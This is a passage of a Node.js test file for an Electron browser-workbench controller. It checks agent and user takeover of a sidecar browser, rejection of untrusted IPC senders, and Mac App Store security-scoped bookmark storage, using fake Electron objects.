const assert = require("node:assert/strict");
const crypto = require("node:crypto");
const { EventEmitter } = require("node:events");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const test = require("node:test");

const {
  createBrowserWorkbenchController,
  getProfilePartition,
  sanitizeProfileId,
} = require("./browserWorkbenchController.cjs");

class FakeDebugger extends EventEmitter {
  constructor() {
    super();
    this.attached = false;
    this.commands = [];
  }

  isAttached() {
    return this.attached;
  }

  attach() {
    this.attached = true;
  }

  sendCommand(method, params) {
    this.commands.push({ method, params });
    if (method === "DOM.getDocument")
      return Promise.resolve({ root: { nodeId: 1 } });
    if (method === "DOM.querySelector") return Promise.resolve({ nodeId: 2 });
    if (method === "Network.getResponseBody")
      return Promise.resolve({ body: "body", base64Encoded: false });
    return Promise.resolve({});
  }
}

class FakeWebContents extends EventEmitter {
  constructor() {
    super();
    this.url = "about:blank";
    this.title = "New Tab";
    this.sent = [];
    this.scripts = [];
    this.debugger = new FakeDebugger();
    this.session = FakeWebContents.sharedSession;
  }

  loadURL(url) {
    this.emit("did-start-loading");
    const finalUrl = FakeWebContents.finalUrlForLoad.get(url) || url;
    this.url = finalUrl;
    this.emit("did-navigate", {}, finalUrl);
    this.emit("did-stop-loading");
    return Promise.resolve();
  }

  getURL() {
    return this.url;
  }

  getTitle() {
    return this.title;
  }

  send(_channel, payload) {
    this.sent.push(payload);
  }

  setWindowOpenHandler(handler) {
    this.windowOpenHandler = handler;
  }

  executeJavaScript(script = "") {
    this.scripts.push(script);
    if (script.includes("const target = queryScoped")) {
      return Promise.resolve({
        ok: true,
        mode: "value",
        scope: {
          frame_selector: "iframe.editor",
          shadow_host_selector: "editor-shell",
        },
      });
    }
    if (script.includes("const fields =")) {
      return Promise.resolve({
        filled: ["#title", "[contenteditable=true]"],
        missing: [],
        details: [
          {
            selector: "#title",
            mode: "value",
            tag: "input",
            contenteditable: false,
            scope: {
              frame_selector: "iframe.editor",
              shadow_host_selector: "editor-shell",
            },
            value_length: 5,
          },
          {
            selector: "[contenteditable=true]",
            mode: "contenteditable_insert_text",
            tag: "div",
            contenteditable: true,
            scope: {
              frame_selector: "iframe.editor",
              shadow_host_selector: "editor-shell",
            },
            value_length: 11,
          },
        ],
      });
    }
    if (script.includes("mouseover")) {
      return Promise.resolve(true);
    }
    if (script.includes("performance.getEntriesByType")) {
      return Promise.resolve({
        navigation: [],
        resources: [],
        paint: [],
        memory: null,
      });
    }
    if (script.includes('const extractKind = "table"')) {
      return Promise.resolve([
        { rows: [["Name", "Value"]], row_count: 1, text: "Name Value" },
      ]);
    }
    if (script.includes('const extractKind = "list"')) {
      return Promise.resolve([
        { text: "Item", href: "https://example.com/item", tag: "li" },
      ]);
    }
    if (script.includes("const fn =")) {
      return Promise.resolve(["row"]);
    }
    return Promise.resolve({
      title: this.title,
      url: this.url,
      text: "snapshot",
      links: [],
      controls: [],
    });
  }

  capturePage() {
    return Promise.resolve({ toPNG: () => Buffer.from("png") });
  }

  sendInputEvent(event) {
    this.sent.push({ input: event });
  }

  insertText(text) {
    this.sent.push({ text });
  }

  printToPDF() {
    return Promise.resolve(Buffer.from("pdf"));
  }

  canGoBack() {
    return false;
  }

  canGoForward() {
    return false;
  }

  isDestroyed() {
    return Boolean(this.destroyed);
  }

  destroy() {
    this.destroyed = true;
  }
}
FakeWebContents.finalUrlForLoad = new Map();
FakeWebContents.sharedSession = null;

class FakeBrowserWindow extends EventEmitter {
  constructor(options) {
    super();
    this.options = options;
    this.webContents = new FakeWebContents();
    this.views = [];
    this.destroyed = false;
    FakeBrowserWindow.instances.push(this);
  }

  loadURL(url) {
    this.loadedUrl = url;
    return Promise.resolve();
  }

  once(eventName, listener) {
    if (eventName === "ready-to-show") {
      listener();
      return this;
    }
    return super.once(eventName, listener);
  }

  show() {
    this.shown = true;
  }

  focus() {
    this.focused = true;
  }

  isDestroyed() {
    return this.destroyed;
  }

  getContentSize() {
    return [1200, 800];
  }

  setBrowserView(view) {
    this.views = [view];
  }

  removeBrowserView(view) {
    this.views = this.views.filter((item) => item !== view);
  }
}
FakeBrowserWindow.instances = [];

class FakeBrowserView {
  constructor(options) {
    this.options = options;
    this.webContents = new FakeWebContents();
    FakeBrowserView.instances.push(this);
  }

  setBounds(bounds) {
    this.bounds = bounds;
  }

  setAutoResize(value) {
    this.autoResize = value;
  }
}
FakeBrowserView.instances = [];

class FakeSession {
  constructor() {
    this.partitions = [];
    this.cleared = [];
  }

  fromPartition(partition) {
    this.partitions.push(partition);
    return {
      flushStorageData: async () => {
        this.cleared.push({ partition, method: "flushStorageData" });
      },
      clearStorageData: async () => {
        this.cleared.push({ partition, method: "clearStorageData" });
      },
      clearCache: async () => {
        this.cleared.push({ partition, method: "clearCache" });
      },
      clearHostResolverCache: async () => {
        this.cleared.push({ partition, method: "clearHostResolverCache" });
      },
    };
  }
}

function makeController(options = {}) {
  const handlers = new Map();
  FakeWebContents.finalUrlForLoad = new Map(
    Object.entries(options.finalUrlForLoad || {}),
  );
  FakeWebContents.sharedSession = options.downloadSession || null;
  const controller = createBrowserWorkbenchController({
    app: {
      getPath: () =>
        options.userDataDir || path.join(os.tmpdir(), "lantai-browser-test"),
      startAccessingSecurityScopedResource:
        options.startAccessingSecurityScopedResource,
    },
    BrowserWindow: FakeBrowserWindow,
    BrowserView: FakeBrowserView,
    ipcMain: {
      handle: (channel, handler) => handlers.set(channel, handler),
    },
    session: options.session || null,
    dialog: options.dialog || null,
    safeStorage: options.safeStorage || null,
    electronDir: __dirname,
    randomToken: options.randomToken || (() => "test-token"),
    distributionChannel: options.distributionChannel || undefined,
    isTrustedIpcEvent: options.isTrustedIpcEvent || (() => true),
    lookupHost:
      options.lookupHost ||
      (async () => [{ address: "93.184.216.34", family: 4 }]),
    resolveProxyForUrl: options.resolveProxyForUrl,
    getMainWindow: options.getMainWindow || (() => null),
    spawnProcess: options.spawnProcess,
    platform: options.platform,
  });
  return { controller, handlers };
}

function makeMainWindow() {
  return {
    webContents: new FakeWebContents(),
    views: [],
    isDestroyed: () => false,
    getContentSize: () => [1200, 800],
    setBrowserView(view) {
      this.views = [view];
    },
    removeBrowserView(view) {
      this.views = this.views.filter((item) => item !== view);
    },
  };
}

test("sidecar preview attaches the live page only after user takeover", async () => {
  const mainWindow = makeMainWindow();
  const { controller } = makeController({ getMainWindow: () => mainWindow });

  const opened = await controller.performAction({
    action: "open",
    profile_id: "research",
    url: "https://example.com/movies",
    metadata: { background_observable: true, task_group_id: "run-movies" },
  });
  const tabId = opened.tabs.find(
    (tab) => tab.task_group_id === "run-movies",
  ).id;
  const mounted = await controller.mountSidecar({
    run_id: "run-movies",
    profile_id: "research",
    bounds: { x: 620, y: 118, width: 570, height: 620 },
  });

  assert.equal(mounted.surface.mode, "sidecar_preview");
  assert.equal(mounted.surface.control_owner, "agent");
  assert.equal(mounted.active_tab_id, tabId);
  assert.deepEqual(mainWindow.views, []);

  const preview = await controller.captureSidecarPreview();
  assert.equal(preview.ok, true);
  assert.match(preview.data_url, /^data:image\/png;base64,/);

  const takeover = await controller.setSidecarControl("user");
  assert.equal(takeover.surface.mode, "sidecar_interactive");
  assert.equal(takeover.surface.control_owner, "user");
  assert.equal(mainWindow.views.length, 1);
  assert.deepEqual(mainWindow.views[0].bounds, {
    x: 620,
    y: 118,
    width: 570,
    height: 620,
  });
  const privatePreview = await controller.captureSidecarPreview();
  assert.equal(privatePreview.ok, false);
  assert.equal(
    privatePreview.error_code,
    "browser_sidecar_user_control_active",
  );
});

test("hiding the sidecar preserves its tabs and returning control detaches input", async () => {
  const mainWindow = makeMainWindow();
  const { controller } = makeController({ getMainWindow: () => mainWindow });
  await controller.mountSidecar({
    run_id: "run-one",
    profile_id: "default",
    url: "https://example.com",
    bounds: { x: 500, y: 100, width: 640, height: 700 },
  });
  await controller.setSidecarControl("user");
  const before = controller.getState();

  const handedBack = await controller.setSidecarControl("agent");
  assert.equal(handedBack.surface.mode, "sidecar_preview");
  assert.deepEqual(mainWindow.views, []);

  const hidden = await controller.unmountSidecar();
  assert.equal(hidden.surface.mode, "hidden");
  assert.equal(hidden.tabs.length, before.tabs.length);
  assert.equal(hidden.tabs.length, 1);
  assert.deepEqual(mainWindow.views, []);
});

test("an in-flight preview is discarded when user takeover begins", async () => {
  const mainWindow = makeMainWindow();
  const { controller } = makeController({ getMainWindow: () => mainWindow });
  await controller.mountSidecar({
    profile_id: "default",
    url: "https://example.com",
    bounds: { x: 500, y: 100, width: 640, height: 700 },
  });
  const activeView = FakeBrowserView.instances.at(-1);
  let finishCapture;
  activeView.webContents.capturePage = () =>
    new Promise((resolve) => {
      finishCapture = () => resolve({ toPNG: () => Buffer.from("private") });
    });

  const pending = controller.captureSidecarPreview();
  await Promise.resolve();
  await controller.setSidecarControl("user");
  finishCapture();

  const preview = await pending;
  assert.equal(preview.ok, false);
  assert.equal(preview.error_code, "browser_sidecar_user_control_active");
  assert.equal(preview.data_url, undefined);
});

test("sidecar IPC rejects untrusted senders and clamps renderer bounds", async () => {
  const mainWindow = makeMainWindow();
  const { controller, handlers } = makeController({
    getMainWindow: () => mainWindow,
    isTrustedIpcEvent: (event) => event.trusted === true,
  });
  controller.installIpcHandlers();

  const rejected = await handlers.get("lantai:browser-workbench-sidecar-mount")(
    { trusted: false },
    { bounds: { x: -50, y: -20, width: 9000, height: 9000 } },
  );
  assert.equal(rejected.error, "untrusted_ipc_sender");

  const mounted = await handlers.get("lantai:browser-workbench-sidecar-mount")(
    { trusted: true },
    {
      profile_id: "default",
      bounds: { x: -50, y: -20, width: 9000, height: 9000 },
    },
  );
  assert.deepEqual(mounted.surface.bounds, {
    x: 0,
    y: 0,
    width: 1200,
    height: 800,
  });
});

test("renderer navigation cannot bypass sidecar takeover ownership", async () => {
  const mainWindow = makeMainWindow();
  const { controller, handlers } = makeController({
    getMainWindow: () => mainWindow,
    isTrustedIpcEvent: () => true,
  });
  controller.installIpcHandlers();
  await controller.mountSidecar({
    profile_id: "default",
    url: "https://example.com",
    bounds: { x: 500, y: 100, width: 640, height: 700 },
  });

  const blocked = await handlers.get("lantai:browser-workbench-action")(
    {},
    { action: "reload" },
  );
  assert.equal(blocked.ok, false);
  assert.equal(blocked.error_code, "browser_sidecar_takeover_required");

  const popoutBlocked = controller.popoutSidecar();
  assert.equal(popoutBlocked.ok, false);
  assert.equal(popoutBlocked.error_code, "browser_sidecar_takeover_required");

  await controller.setSidecarControl("user");
  const allowed = await handlers.get("lantai:browser-workbench-action")(
    {},
    { action: "reload" },
  );
  assert.equal(allowed.ok, true);
});

test("external takeover focuses only an allowlisted browser application", async () => {
  const spawned = [];
  const { controller } = makeController({
    platform: "darwin",
    spawnProcess: (...args) => {
      spawned.push(args);
      const child = new EventEmitter();
      child.stderr = new EventEmitter();
      process.nextTick(() => child.emit("close", 0));
      return child;
    },
  });

  assert.equal(
    (await controller.focusExternalBrowser("Google Chrome")).ok,
    true,
  );
  assert.deepEqual(spawned[0][0], "/usr/bin/open");
  assert.deepEqual(spawned[0][1], ["-a", "Google Chrome"]);
  assert.equal(
    (await controller.focusExternalBrowser("Some Browser")).ok,
    false,
  );
  assert.equal(spawned.length, 1);
});

function makeSafeStorage() {
  return {
    isEncryptionAvailable: () => true,
    encryptString: (value) => Buffer.from(`safe:${value}`, "utf8"),
    decryptString: (value) => {
      const text = Buffer.from(value).toString("utf8");
      assert.match(text, /^safe:/);
      return text.slice("safe:".length);
    },
  };
}

function signBridgeActionCapability(rootToken, body, options = {}) {
  const expiresAtMs = options.expiresAtMs || Date.now() + 10000;
  const nonce = options.nonce || "nonce-1";
  const bodyHash = crypto.createHash("sha256").update(body).digest("hex");
  const message = ["v1", String(expiresAtMs), nonce, bodyHash].join("\n");
  const signature = crypto
    .createHmac("sha256", rootToken)
    .update(message)
    .digest("hex");
  return ["v1", String(expiresAtMs), nonce, bodyHash, signature].join(":");
}

function readProfileCanonicalizationCases() {
  const fixturePath = path.join(
    __dirname,
    "..",
    "..",
    "tests",
    "fixtures",
    "browser_profile_canonicalization.json",
  );
  return JSON.parse(fs.readFileSync(fixturePath, "utf8"));
}

test("profile partitions are stable and isolated", () => {
  assert.equal(sanitizeProfileId("GitHub Work"), "github-work");
  assert.equal(
    getProfilePartition("GitHub Work"),
    "persist:lantai-browser-github-work",
  );
});

test("profile canonicalization matches shared fixture", () => {
  for (const item of readProfileCanonicalizationCases()) {
    assert.equal(sanitizeProfileId(item.input), item.canonical);
    assert.equal(
      getProfilePartition(item.input),
      `persist:lantai-browser-${item.canonical}`,
    );
  }
});

test("workbench opens a window with a profile-isolated tab", async () => {
  FakeBrowserWindow.instances.length = 0;
  FakeBrowserView.instances.length = 0;
  const { controller } = makeController();

  const result = await controller.performAction({
    action: "open_workbench",
    profile_id: "GitHub Work",
    url: "https://github.com",
  });

  assert.equal(result.ok, true);
  assert.equal(FakeBrowserWindow.instances.length, 1);
  assert.equal(FakeBrowserView.instances.length, 1);
  assert.equal(
    FakeBrowserView.instances[0].options.webPreferences.partition,
    "persist:lantai-browser-github-work",
  );
  assert.equal(result.tabs[0].profile_id, "github-work");
});

test("renderer crash replaces the dead tab without replaying its last action", async () => {
  FakeBrowserWindow.instances = [];
  FakeBrowserView.instances = [];
  const { controller } = makeController();
  const opened = await controller.performAction({
    action: "open_workbench",
    profile_id: "GitHub Work",
    url: "https://github.com",
  });
  const staleTabId = opened.active_tab_id;
  const staleWebContents = FakeBrowserView.instances.at(-1).webContents;

  staleWebContents.destroyed = true;
  staleWebContents.emit("render-process-gone", {}, { reason: "crashed" });

  const state = controller.getState();
  assert.equal(state.tabs.length, 1);
  assert.notEqual(state.active_tab_id, staleTabId);
  assert.equal(state.tabs[0].url, "about:blank");
  assert.equal(state.tabs[0].profile_id, "github-work");

  const staleAction = await controller.performAction({
    action: "click",
    tab_id: staleTabId,
    selector: "button.publish",
  });
  assert.equal(staleAction.ok, false);
  assert.equal(staleAction.error_code, "browser_tab_renderer_gone");
  assert.equal(staleAction.recoverable, true);
  assert.equal(staleAction.replacement_page_id, state.active_tab_id);
});

test("MAS bridge exposes capability matrix and blocks browser writes before opening tabs", async () => {
  FakeBrowserWindow.instances = [];
  FakeBrowserView.instances = [];
  const { controller } = makeController({ distributionChannel: "mas" });

  const state = await controller.performAction({ action: "state" });
  const blocked = await controller.performAction({
    action: "click",
    selector: "button.publish",
  });

  assert.equal(state.capability_matrix.browser_write.mode, "disabled");
  assert.equal(
    state.capability_matrix.browser_write.reason_code,
    "mas_browser_write_disabled",
  );
  assert.equal(blocked.ok, false);
  assert.equal(blocked.error_code, "mas_browser_write_disabled");
  assert.equal(blocked.capability_matrix_id, "browser_write");
  assert.equal(blocked.capability_matrix_mode, "disabled");
  assert.equal(FakeBrowserWindow.instances.length, 0);
  assert.equal(FakeBrowserView.instances.length, 0);
});

test("bridge default distribution honors LANTAI_APP_STORE even with other channel env", async () => {
  const previousAppStore = process.env.LANTAI_APP_STORE;
  const previousReleaseChannel = process.env.LANTAI_RELEASE_CHANNEL;
  try {
    process.env.LANTAI_APP_STORE = "1";
    process.env.LANTAI_RELEASE_CHANNEL = "stable";
    const { controller } = makeController();

    const state = await controller.performAction({ action: "state" });

    assert.equal(state.capability_distribution, "app_store");
    assert.equal(
      state.capability_matrix.browser_write.reason_code,
      "mas_browser_write_disabled",
    );
  } finally {
    if (previousAppStore === undefined) {
      delete process.env.LANTAI_APP_STORE;
    } else {
      process.env.LANTAI_APP_STORE = previousAppStore;
    }
    if (previousReleaseChannel === undefined) {
      delete process.env.LANTAI_RELEASE_CHANNEL;
    } else {
      process.env.LANTAI_RELEASE_CHANNEL = previousReleaseChannel;
    }
  }
});

test("MAS bridge blocks browser file transfer actions with matrix reason", async () => {
  FakeBrowserWindow.instances = [];
  FakeBrowserView.instances = [];
  const { controller } = makeController({ distributionChannel: "mas" });

  const upload = await controller.performAction({
    action: "upload_file",
    file_path: "/tmp/report.csv",
    file_grant_id: "grant-1",
  });
  const download = await controller.performAction({
    action: "download_wait",
    filename: "report.csv",
  });

  assert.equal(upload.ok, false);
  assert.equal(upload.error_code, "mas_security_scoped_bookmark_required");
  assert.equal(upload.capability_matrix_id, "browser_upload_download");
  assert.equal(upload.capability_matrix_mode, "interactive_only");
  assert.equal(download.ok, false);
  assert.equal(download.error_code, "mas_security_scoped_bookmark_required");
  assert.equal(FakeBrowserWindow.instances.length, 0);
  assert.equal(FakeBrowserView.instances.length, 0);
});

test("MAS picker-backed grant starts and releases security-scoped resource", async () => {
  FakeBrowserWindow.instances = [];
  FakeBrowserView.instances = [];
  const userDataDir = fs.mkdtempSync(
    path.join(os.tmpdir(), "lantai-mas-bookmark-"),
  );
  const uploadPath = path.join(userDataDir, "lantai-mas-upload.txt");
  fs.writeFileSync(uploadPath, "upload");
  const dialogCalls = [];
  const releasedBookmarks = [];
  const { controller, handlers } = makeController({
    userDataDir,
    distributionChannel: "mas",
    safeStorage: makeSafeStorage(),
    dialog: {
      showOpenDialog: async (...args) => {
        dialogCalls.push(args);
        return {
          canceled: false,
          filePaths: [uploadPath],
          bookmarks: ["bookmark-data"],
        };
      },
    },
    startAccessingSecurityScopedResource: (bookmark) => {
      assert.equal(bookmark, "bookmark-data");
      return () => releasedBookmarks.push(bookmark);
    },
  });
  controller.installIpcHandlers();

  const selection = await handlers.get(
    "lantai:browser-workbench-select-file-grant",
  )({}, { default_path: uploadPath });

  assert.equal(selection.ok, true);
  assert.equal(selection.path, uploadPath);
  assert.equal(selection.security_scoped_bookmark, true);
  assert.match(selection.security_scope_ref, /^browser-security-scope:/);
  assert.match(selection.security_scope_bookmark_sha256, /^sha256:/);
  assert.equal(selection.security_scope_bookmark_persisted, true);
  assert.match(selection.path_sha256, /^sha256:/);
  assert.equal(dialogCalls[0].at(-1).securityScopedBookmarks, true);
  assert.equal(dialogCalls[0].at(-1).defaultPath, uploadPath);
  const storePath = path.join(
    userDataDir,
    "browser-workbench",
    "security-scoped-bookmarks.json",
  );
  const persistedStore = fs.readFileSync(storePath, "utf8");
  assert.match(persistedStore, /electron_safe_storage_v1/);
  assert.doesNotMatch(persistedStore, /bookmark-data/);
  assert.doesNotMatch(persistedStore, /lantai-mas-upload\.txt/);

  const uploaded = await controller.performAction({
    action: "upload_file",
    path: uploadPath,
    file_grant_id: "grant-1",
    metadata: {
      file_grant_id: "grant-1",
      security_scope_ref: selection.security_scope_ref,
    },
  });
  const restoredReuse = await controller.performAction({
    action: "upload_file",
    path: uploadPath,
    file_grant_id: "grant-1",
    metadata: {
      file_grant_id: "grant-1",
      security_scope_ref: selection.security_scope_ref,
    },
  });

  assert.equal(uploaded.ok, true);
  assert.equal(uploaded.data.file_name, "lantai-mas-upload.txt");
  assert.equal(restoredReuse.ok, true);
  assert.deepEqual(releasedBookmarks, ["bookmark-data", "bookmark-data"]);
});

test("MAS bookmark persistence fsyncs the encrypted store before reporting success", async () => {
  FakeBrowserWindow.instances = [];
  FakeBrowserView.instances = [];
  const userDataDir = fs.mkdtempSync(
    path.join(os.tmpdir(), "lantai-mas-fsync-"),
  );
  const uploadPath = path.join(userDataDir, "fsync-upload.txt");
  fs.writeFileSync(uploadPath, "upload");
  const originalFsyncSync = fs.fsyncSync;
  let fsyncCalls = 0;
  fs.fsyncSync = (fd) => {
    fsyncCalls += 1;
    return originalFsyncSync(fd);
  };

  try {
    const { controller, handlers } = makeController({
      userDataDir,
      distributionChannel: "mas",
      safeStorage: makeSafeStorage(),
      dialog: {
        showOpenDialog: async () => ({
          canceled: false,
          filePaths: [uploadPath],
          bookmarks: ["bookmark-fsync"],
        }),
      },
      startAccessingSecurityScopedResource: () => () => {},
    });
    controller.installIpcHandlers();
    const selection = await handlers.get(
      "lantai:browser-workbench-select-file-grant",
    )({});

    assert.equal(selection.ok, true);
    assert.ok(fsyncCalls >= 1);
  } finally {
    fs.fsyncSync = originalFsyncSync;
  }
});

test("MAS bookmark persistence quarantines a corrupt store before replacing it", async () => {
  FakeBrowserWindow.instances = [];
  FakeBrowserView.instances = [];
  const userDataDir = fs.mkdtempSync(
    path.join(os.tmpdir(), "lantai-mas-corrupt-"),
  );
  const storeDir = path.join(userDataDir, "browser-workbench");
  const storePath = path.join(storeDir, "security-scoped-bookmarks.json");
  const uploadPath = path.join(userDataDir, "corrupt-store-upload.txt");
  fs.mkdirSync(storeDir, { recursive: true });
  fs.writeFileSync(storePath, "{not-json", { mode: 0o600 });
  fs.writeFileSync(uploadPath, "upload");

  const { controller, handlers } = makeController({
    userDataDir,
    distributionChannel: "mas",
    safeStorage: makeSafeStorage(),
    dialog: {
      showOpenDialog: async () => ({
        canceled: false,
        filePaths: [uploadPath],
        bookmarks: ["bookmark-after-corruption"],
      }),
    },
    startAccessingSecurityScopedResource: () => () => {},
  });
  controller.installIpcHandlers();
  const selection = await handlers.get(
    "lantai:browser-workbench-select-file-grant",
  )({});

  assert.equal(selection.ok, true);
  const quarantined = fs
    .readdirSync(storeDir)
    .filter((name) =>
      name.startsWith("security-scoped-bookmarks.json.corrupt-"),
    );
  assert.equal(quarantined.length, 1);
  assert.equal(
    fs.readFileSync(path.join(storeDir, quarantined[0]), "utf8"),
    "{not-json",
  );
  const replacement = JSON.parse(fs.readFileSync(storePath, "utf8"));
  assert.equal(Object.keys(replacement.records).length, 1);
});

test("MAS bookmark persistence fails closed when corrupt-store quarantine fails", async () => {
  FakeBrowserWindow.instances = [];
  FakeBrowserView.instances = [];
  const userDataDir = fs.mkdtempSync(
    path.join(os.tmpdir(), "lantai-mas-quarantine-fail-"),
  );
  const storeDir = path.join(userDataDir, "browser-workbench");
  const storePath = path.join(storeDir, "security-scoped-bookmarks.json");
  const uploadPath = path.join(userDataDir, "quarantine-fail-upload.txt");
  fs.mkdirSync(storeDir, { recursive: true });
  fs.writeFileSync(storePath, "{not-json", { mode: 0o600 });
  fs.writeFileSync(uploadPath, "upload");
  const originalRenameSync = fs.renameSync;
  let releaseCalls = 0;
  fs.renameSync = (source, destination) => {
    if (path.resolve(String(source)) === path.resolve(storePath)) {
      throw new Error("quarantine denied");
    }
    return originalRenameSync(source, destination);
  };

  try {
    const { controller, handlers } = makeController({
      userDataDir,
      distributionChannel: "mas",
      safeStorage: makeSafeStorage(),
      dialog: {
        showOpenDialog: async () => ({
          canceled: false,
          filePaths: [uploadPath],
          bookmarks: ["bookmark-quarantine-fail"],
        }),
      },
      startAccessingSecurityScopedResource: () => () => {
        releaseCalls += 1;
      },
    });
    controller.installIpcHandlers();
    const selection = await handlers.get(
      "lantai:browser-workbench-select-file-grant",
    )({});

    assert.equal(selection.ok, false);
    assert.equal(
      selection.error_code,
      "mas_security_scope_secure_store_failed",
    );
    assert.equal(releaseCalls, 1);
    assert.equal(fs.readFileSync(storePath, "utf8"), "{not-json");
    assert.deepEqual(fs.readdirSync(storeDir), [
      "security-scoped-bookmarks.json",
    ]);
  } finally {
    fs.renameSync = originalRenameSync;
  }
});

test("MAS bookmark persistence removes temp state and releases scope after fsync failure", async () => {
  FakeBrowserWindow.instances = [];
  FakeBrowserView.instances = [];
  const userDataDir = fs.mkdtempSync(
    path.join(os.tmpdir(), "lantai-mas-fsync-fail-"),
  );
  const storeDir = path.join(userDataDir, "browser-workbench");
  const uploadPath = path.join(userDataDir, "fsync-fail-upload.txt");
  fs.writeFileSync(uploadPath, "upload");
  const originalFsyncSync = fs.fsyncSync;
  let releaseCalls = 0;
  fs.fsyncSync = () => {
    throw new Error("fsync failed");
  };

  try {
    const { controller, handlers } = makeController({
      userDataDir,
      distributionChannel: "mas",
      safeStorage: makeSafeStorage(),
      dialog: {
        showOpenDialog: async () => ({
          canceled: false,
          filePaths: [uploadPath],
          bookmarks: ["bookmark-fsync-fail"],
        }),
      },
      startAccessingSecurityScopedResource: () => () => {
        releaseCalls += 1;
      },
    });
    controller.installIpcHandlers();
    const selection = await handlers.get(
      "lantai:browser-workbench-select-file-grant",
    )({});

    assert.equal(selection.ok, false);
    assert.equal(
      selection.error_code,
      "mas_security_scope_secure_store_failed",
    );
    assert.equal(releaseCalls, 1);
    assert.equal(
      fs.existsSync(path.join(storeDir, "security-scoped-bookmarks.json")),
      false,
    );
    assert.deepEqual(
      fs.existsSync(storeDir) ? fs.readdirSync(storeDir) : [],
      [],
    );
  } finally {
    fs.fsyncSync = originalFsyncSync;
  }
});

test("MAS upload rejects a security scope bound to a different file", async () => {
  FakeBrowserWindow.instances = [];
  FakeBrowserView.instances = [];
  const userDataDir = fs.mkdtempSync(
    path.join(os.tmpdir(), "lantai-mas-scope-path-"),
  );
  const grantedPath = path.join(userDataDir, "granted.txt");
  const differentPath = path.join(userDataDir, "different.txt");
  fs.writeFileSync(grantedPath, "granted");
  fs.writeFileSync(differentPath, "different");
  const { controller, handlers } = makeController({
    userDataDir,
    distributionChannel: "mas",
    safeStorage: makeSafeStorage(),
    dialog: {
      showOpenDialog: async () => ({
        canceled: false,
        filePaths: [grantedPath],
        bookmarks: ["bookmark-path-bound"],
      }),
    },
    startAccessingSecurityScopedResource: () => () => {},
  });
  controller.installIpcHandlers();
  const selection = await handlers.get(
    "lantai:browser-workbench-select-file-grant",
  )({});
  await controller.performAction({
    action: "open_workbench",
    url: "https://example.com/upload",
  });

  const upload = await controller.performAction({
    action: "upload_file",
    path: differentPath,
    file_grant_id: "grant-path-mismatch",
    metadata: {
      file_grant_id: "grant-path-mismatch",
      security_scope_ref: selection.security_scope_ref,
    },
  });

  assert.equal(upload.ok, false);
  assert.equal(upload.error_code, "mas_security_scope_path_mismatch");
});

test("MAS security-scoped bookmark restores after controller restart", async () => {
  FakeBrowserWindow.instances = [];
  FakeBrowserView.instances = [];
  const userDataDir = fs.mkdtempSync(
    path.join(os.tmpdir(), "lantai-mas-restore-"),
  );
  const uploadPath = path.join(userDataDir, "restore-upload.txt");
  fs.writeFileSync(uploadPath, "upload");
  const safeStorage = makeSafeStorage();
  const releasedBookmarks = [];
  const first = makeController({
    userDataDir,
    distributionChannel: "mas",
    safeStorage,
    dialog: {
      showOpenDialog: async () => ({
        canceled: false,
        filePaths: [uploadPath],
        bookmarks: ["bookmark-restart"],
      }),
    },
    startAccessingSecurityScopedResource: (bookmark) => {
      assert.equal(bookmark, "bookmark-restart");
      return () => releasedBookmarks.push(`first:${bookmark}`);
    },
  });
  first.controller.installIpcHandlers();
  const selection = await first.handlers.get(
    "lantai:browser-workbench-select-file-grant",
  )({});
  assert.equal(selection.ok, true);
  assert.equal(selection.security_scope_bookmark_persisted, true);

  const restoredBookmarks = [];
  const second = makeController({
    userDataDir,
    distributionChannel: "mas",
    safeStorage,
    startAccessingSecurityScopedResource: (bookmark) => {
      assert.equal(bookmark, "bookmark-restart");
      restoredBookmarks.push(bookmark);
      return () => releasedBookmarks.push(`second:${bookmark}`);
    },
  });
  const restored = await second.controller.performAction({
    action: "restore_security_scope",
    security_scope_ref: selection.security_scope_ref,
  });
  const uploaded = await second.controller.performAction({
    action: "upload_file",
    path: uploadPath,
    file_grant_id: "grant-restart",
    metadata: {
      file_grant_id: "grant-restart",
      security_scope_ref: selection.security_scope_ref,
    },
  });

  assert.equal(restored.ok, true);
  assert.equal(restored.security_scope_restored, true);
  assert.equal(restored.security_scope_ref, selection.security_scope_ref);
  assert.equal(uploaded.ok, true);
  assert.equal(uploaded.data.file_name, "restore-upload.txt");
  assert.deepEqual(restoredBookmarks, ["bookmark-restart"]);
  assert.deepEqual(releasedBookmarks, ["second:bookmark-restart"]);
});

test("MAS bookmark restore activates the security scope before checking target visibility", async () => {
  FakeBrowserWindow.instances = [];
  FakeBrowserView.instances = [];
  const userDataDir = fs.mkdtempSync(
    path.join(os.tmpdir(), "lantai-mas-sandbox-restore-"),
  );
  const uploadPath = path.join(userDataDir, "sandboxed-upload.txt");
  fs.writeFileSync(uploadPath, "upload");
  const safeStorage = makeSafeStorage();
  const first = makeController({
    userDataDir,
    distributionChannel: "mas",
    safeStorage,
    dialog: {
      showOpenDialog: async () => ({
        canceled: false,
        filePaths: [uploadPath],
        bookmarks: ["bookmark-sandbox-restart"],
      }),
    },
    startAccessingSecurityScopedResource: () => () => {},
  });
  first.controller.installIpcHandlers();
  const selection = await first.handlers.get(
    "lantai:browser-workbench-select-file-grant",
  )({});
  assert.equal(selection.ok, true);

  const originalExistsSync = fs.existsSync;
  let scopeActive = false;
  let startCalls = 0;
  let targetVisibilityChecks = 0;
  fs.existsSync = (candidate) => {
    if (path.resolve(String(candidate)) === path.resolve(uploadPath)) {
      targetVisibilityChecks += 1;
      return scopeActive;
    }
    return originalExistsSync(candidate);
  };
  try {
    const second = makeController({
      userDataDir,
      distributionChannel: "mas",
      safeStorage,
      startAccessingSecurityScopedResource: (bookmark) => {
        assert.equal(bookmark, "bookmark-sandbox-restart");
        startCalls += 1;
        scopeActive = true;
        return () => {
          scopeActive = false;
        };
      },
    });
    const restored = await second.controller.performAction({
      action: "restore_security_scope",
      security_scope_ref: selection.security_scope_ref,
    });

    assert.equal(restored.ok, true);
    assert.equal(restored.security_scope_restored, true);
    assert.equal(startCalls, 1);
    assert.ok(targetVisibilityChecks >= 1);
  } finally {
    fs.existsSync = originalExistsSync;
  }
});

test("MAS restored bookmark is marked stale when target file is gone", async () => {
  FakeBrowserWindow.instances = [];
  FakeBrowserView.instances = [];
  const userDataDir = fs.mkdtempSync(
    path.join(os.tmpdir(), "lantai-mas-stale-"),
  );
  const uploadPath = path.join(userDataDir, "stale-upload.txt");
  fs.writeFileSync(uploadPath, "upload");
  const safeStorage = makeSafeStorage();
  const first = makeController({
    userDataDir,
    distributionChannel: "mas",
    safeStorage,
    dialog: {
      showOpenDialog: async () => ({
        canceled: false,
        filePaths: [uploadPath],
        bookmarks: ["bookmark-stale"],
      }),
    },
    startAccessingSecurityScopedResource: () => () => {},
